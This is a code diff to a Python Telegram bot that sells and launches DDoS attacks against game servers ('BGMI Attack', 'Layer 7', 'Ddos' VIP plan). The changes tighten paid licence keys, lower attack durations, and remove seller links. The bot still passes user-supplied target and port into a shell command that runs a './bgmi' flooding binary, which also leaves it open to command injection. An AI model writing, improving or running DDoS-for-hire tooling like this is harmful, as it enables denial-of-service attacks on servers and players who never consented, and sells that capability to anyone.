@@ -61,7 +61,7 @@ def check_authorization(func):
 
 def authorize_user(message, func):
     user_id = str(message.chat.id)
-    if is_key_valid(message.text):
+    if is_key_valid(message.text, user_id):
         allowed_user_ids.append(user_id)
         with open(USER_FILE, "a") as file:
             file.write(f"{user_id}\n")
@@ -100,8 +100,9 @@ def handle_key_duration(call):
         }
         
         duration = duration_mapping[call.data]
-        bot.send_message(call.message.chat.id, "Enter the number of devices:")
-        bot.register_next_step_handler(call.message, capture_number_of_devices, duration)
+        key = generate_key(duration, user_id)
+        response = f"Generated a key with a duration of {duration} days:\n\n{key}"
+        bot.send_message(call.message.chat.id, response)
     else:
         bot.reply_to(call.message, "You are not authorized to use this command.")
 
@@ -335,7 +336,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"STARTED ATTACK\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Layer 7"
+    response = f"STARTED ATTACK\n\nTarget: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} Seconds\nMethod: Layer 7"
     bot.reply_to(message, response)
 
 # Dictionary to store the state of each user
@@ -381,8 +382,8 @@ def handle_bgmi_steps(message):
             markup.row_width = 2
             markup.add(
                 InlineKeyboardButton("60 seconds", callback_data="60"),
-                InlineKeyboardButton("180 seconds", callback_data="180"),
-                InlineKeyboardButton("240 seconds", callback_data="240")
+                InlineKeyboardButton("120 seconds", callback_data="120"),
+                InlineKeyboardButton("180 seconds", callback_data="180")
             )
             bot.reply_to(message, "Choose duration:", reply_markup=markup)
         except ValueError:
@@ -395,8 +396,8 @@ def handle_duration_choice(call):
         state = user_state[user_id]
         try:
             state['time'] = int(call.data)
-            if state['time'] > 240:
-                bot.reply_to(call.message, "Error: Time interval must be less than 240 seconds.")
+            if state['time'] > 180:
+                bot.reply_to(call.message, "Error: Time interval must be less than 180 seconds.")
             else:
                 if user_id in ongoing_attacks:
                     bot.reply_to(call.message, "An attack is already in progress. Please wait until it's finished.")
@@ -406,7 +407,7 @@ def handle_duration_choice(call):
                 log_command(user_id, state['target'], state['port'], state['time'])
                 ongoing_attacks[user_id] = True
                 start_attack_reply(call.message, state['target'], state['port'], state['time'])
-                full_command = f"./bgmi {state['target']} {state['port']} {state['time']} 240"
+                full_command = f"./bgmi {state['target']} {state['port']} {state['time']} 80"
                 subprocess.run(full_command, shell=True)
                 bot.reply_to(call.message, f"BGMI Attack Finished. Target: {state['target']} Port: {state['port']} Duration: {state['time']} seconds")
                 del ongoing_attacks[user_id]
@@ -504,9 +505,6 @@ def show_settings(message):
  
 ➡️ ADMIN CONTROL SETTINGS : /admin
 
-Buy From :- @S
-
-Official Channel :- t.me/+xtM
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -525,7 +523,7 @@ def welcome_start(message):
     user_id = str(message.from_user.id)
     username = message.from_user.username
     
-    response = f'''😍Welcome,
+    response = f'''😍Welcome 3.3.1 Server Freeze,
     
 {user_name}!.
     
@@ -533,8 +531,7 @@ def welcome_start(message):
     
 ➡️ To Run This Command : /settings 
 
-➡️ Join Telegram :- t.me/+xtM'''
-    
+'''    
     admin_message = f"New user started the bot:\nUsername: @{username}\nUser ID: {user_id}"
     
     # Send a message to the admin
@@ -572,7 +569,7 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip  :
--> Attack Time : 240 (S)
+-> Attack Time : 180 (S)
 > After Attack Limit : 1 Min
 -> Concurrents Attack : 3
 
@@ -631,17 +628,19 @@ def set_bot_commands():
     ]
     bot.set_my_commands(commands)
     
-def generate_key(duration: datetime.timedelta):
+def generate_key(duration: datetime.timedelta, user_id: str):
     key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
     expiry_date = datetime.datetime.now() + duration
-    keys[key] = expiry_date
+    keys[key] = {"expiry_date": expiry_date, "user_id": user_id}
     save_keys()
     return key
 
 
-def is_key_valid(key):
+def is_key_valid(key, user_id: str):
     if key in keys:
-        if datetime.datetime.now() < keys[key]:
+        if datetime.datetime.now() < keys[key]["expiry_date"] and keys[key]["user_id"] == user_id:
+            del keys[key]  # Delete key after it's used
+            save_keys()
             return True
         else:
             del keys[key]
@@ -662,11 +661,7 @@ def create_duration_keyboard():
         InlineKeyboardButton("7 Days", callback_data="7_days"),
         InlineKeyboardButton("30 Days", callback_data="30_days")
     )
-    return markup
-
-
-    
-                
+    return markup              
  
     
           
@@ -709,9 +704,6 @@ def create_admin_keyboard():
     return markup
 
 
-
-
-    
     
 @bot.message_handler(func=lambda message: message.text in ["⚔️ START ATTACK ⚔️", "RULES ℹ️", "MY LOGS 📝", "HELP ❓", "BUY PLAN 🛒"])
 def handle_user_buttons(message):
